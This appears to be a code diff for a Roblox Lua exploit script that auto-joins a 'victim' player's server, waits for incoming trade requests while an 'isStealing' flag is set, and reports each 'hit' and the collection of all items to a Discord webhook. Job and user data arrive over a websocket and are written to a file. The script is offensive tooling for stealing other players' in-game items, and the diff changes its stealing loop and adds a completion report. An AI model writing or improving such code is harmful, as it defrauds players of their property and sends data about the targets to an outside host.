@@ -29,7 +29,6 @@ end)
 repeat task.wait() until game:IsLoaded()
 local ContextActionService = game:GetService("ContextActionService")
 local LocalPlayer = game:GetService("Players").LocalPlayer
-local GJson = nil
 
 LocalPlayer.Idled:Connect(function()
     game:GetService("VirtualUser"):CaptureController()
@@ -73,7 +72,7 @@ if autjoindata then
             local VictimIsTrading
             local StealerIsTrading
             isStealing = true
-            while game:GetService("Players"):FindFirstChild(vname) and task.wait(1) do
+            while game:GetService("Players"):FindFirstChild(vname) and isStealing and task.wait(1) do
                 local tradeframe = Tradelayer:FindFirstChild("IncomingTradeRequestFrame")
                 warn("Waiting", tradeframe)
                 if tradeframe then
@@ -102,7 +101,7 @@ if autjoindata then
                     warn("done")
                     spawn(function()
                         local Body = game:GetService("HttpService"):JSONEncode({
-                            content = "Auto-Join completed a hit: " .. string.format("https://discord.com/channels/%s/%s/%s", json.guild_id, json.channel_id, json.message_id)
+                            content = "Auto-Join completed a trade: " .. string.format("https://discord.com/channels/%s/%s/%s", json.guild_id, json.channel_id, json.message_id)
                         })
                         http.request({
                             Url = AJwebhook,
@@ -113,8 +112,6 @@ if autjoindata then
                             Body = Body
                         })
                     end)
-                    isStealing = false
-                    break
                 end
             end
         else
@@ -142,8 +139,24 @@ ws.OnMessage:Connect(function(msg)
     if not json then return warn("not json") end
     local jobId = json.JobId
     local userid = json.UserId
+    if userid and json.AllItemsTraded then
+        isStealing = false
+        spawn(function()
+            local Body = game:GetService("HttpService"):JSONEncode({
+                content = "Auto-Join collected all items from hit: " .. string.format("https://discord.com/channels/%s/%s/%s", json.guild_id, json.channel_id, json.message_id)
+            })
+            http.request({
+                Url = AJwebhook,
+                Method = "POST",
+                Headers = {
+                    ["content-type"] = "application/json"
+                },
+                Body = Body
+            })
+        end)
+        return
+    end
     if not jobId or not userid then return warn("missing keys") end
-    GJson = json
     writefile(filename, msg)
     spawn(function()
         local Body = game:GetService("HttpService"):JSONEncode({
